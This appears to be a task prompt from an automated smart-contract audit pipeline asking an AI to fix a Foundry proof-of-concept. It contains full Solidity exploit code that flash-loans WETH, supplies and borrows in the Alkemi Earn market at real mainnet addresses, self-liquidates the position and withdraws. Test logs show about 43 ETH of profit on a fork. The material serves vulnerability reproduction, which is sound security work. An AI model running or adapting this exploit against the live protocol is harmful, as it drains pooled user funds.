You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Same-market self-liquidation of a freshly opened position can over-credit collateral and drain the pool
- claim: The reproduced exploit shows an attacker can supply `aweth`, borrow the same `aweth` market against that deposit, query their own debt, and immediately call `liquidateBorrow(address(this), aweth, aweth, amount)` before withdrawing all collateral. A healthy position should not become liquidatable in the same transaction with no price move, and allowing the borrower to liquidate the same market they borrowed against indicates the liquidation/accounting path misprices or double-counts collateral when `borrow == collateral` and `borrower == liquidator`. The successful follow-up `withdraw(..., type(uint256).max)` demonstrates the attacker can redeem more value than should remain after repaying the debt.
- impact: An attacker can use flash liquidity to open a same-asset position, self-liquidate it, capture the liquidation incentive or accounting mismatch, and withdraw inflated collateral, directly draining protocol funds.
- exploit_paths: ["Flash-loan WETH -> `supply(aweth, 50 ether)` -> `borrow(aweth, 39.5 ether)` -> `getBorrowBalance(address(this), aweth)` -> `liquidateBorrow(address(this), aweth, aweth, amount)` -> `withdraw(aweth, type(uint256).max)`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IAlkemiEarn {
    function supply(address token, uint256 amount) external payable;
    function borrow(address token, uint256 amount) external;
    function getBorrowBalance(address user, address token) external view returns (uint256);
    function liquidateBorrow(address borrower, address borrowAsset, address collateral, uint256 amountClose) external payable;
    function withdraw(address token, uint256 amount) external;
}

contract FlawVerifier {
    IBalancerVault internal constant BALANCER_VAULT =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAlkemiEarn internal constant ALKEMI = IAlkemiEarn(0x4822D9172e5b76b9Db37B75f5552F9988F98a888);
    address internal constant AWETH = 0x8125afd067094cD573255f82795339b9fe2A40ab;

    uint256 internal constant FLASH_LOAN_AMOUNT = 51 ether;
    uint256 internal constant SUPPLY_AMOUNT = 50 ether;
    uint256 internal constant BORROW_AMOUNT = 39.5 ether;

    uint256 internal startingAssetBase;
    uint256 internal realizedProfit;
    bool internal executing;
    bool internal executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        startingAssetBase = address(this).balance + WETH.balanceOf(address(this));

        if (_availableBaseLiquidity() >= FLASH_LOAN_AMOUNT) {
            _ensureEth(FLASH_LOAN_AMOUNT);
            _runExploit();
            _wrapAllEth();
        } else {
            executing = true;

            address[] memory tokens = new address[](1);
            tokens[0] = address(WETH);

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = FLASH_LOAN_AMOUNT;

            BALANCER_VAULT.flashLoan(address(this), tokens, amounts, bytes(""));

            executing = false;
        }

        realizedProfit = WETH.balanceOf(address(this)) - startingAssetBase;
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(BALANCER_VAULT), "not vault");
        require(executing, "not executing");
        require(amounts.length == 1 && feeAmounts.length == 1, "unexpected arrays");

        _ensureEth(amounts[0]);
        _runExploit();

        uint256 repayment = amounts[0] + feeAmounts[0];
        _ensureEth(repayment);
        WETH.deposit{value: repayment}();
        require(WETH.transfer(address(BALANCER_VAULT), repayment), "repay failed");

        _wrapAllEth();
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _runExploit() internal {
        ALKEMI.supply{value: SUPPLY_AMOUNT}(AWETH, SUPPLY_AMOUNT);
        ALKEMI.borrow(AWETH, BORROW_AMOUNT);

        uint256 debt = ALKEMI.getBorrowBalance(address(this), AWETH);

        ALKEMI.liquidateBorrow{value: debt}(address(this), AWETH, AWETH, debt);
        ALKEMI.withdraw(AWETH, type(uint256).max);
    }

    function _availableBaseLiquidity() internal view returns (uint256) {
        return address(this).balance + WETH.balanceOf(address(this));
    }

    function _ensureEth(uint256 amount) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance < amount) {
            WETH.withdraw(amount - ethBalance);
        }
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            // Any residual ETH from the exploit is wrapped into canonical on-chain WETH
            // so profit accounting uses a pre-existing token rather than raw ETH.
            WETH.deposit{value: ethBalance}();
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 5.55s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 2826510)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 43454527021548053172
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 43454527021548053172
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 501.25ms (480.39ms CPU time)

Ran 1 test suite in 512.42ms (501.25ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
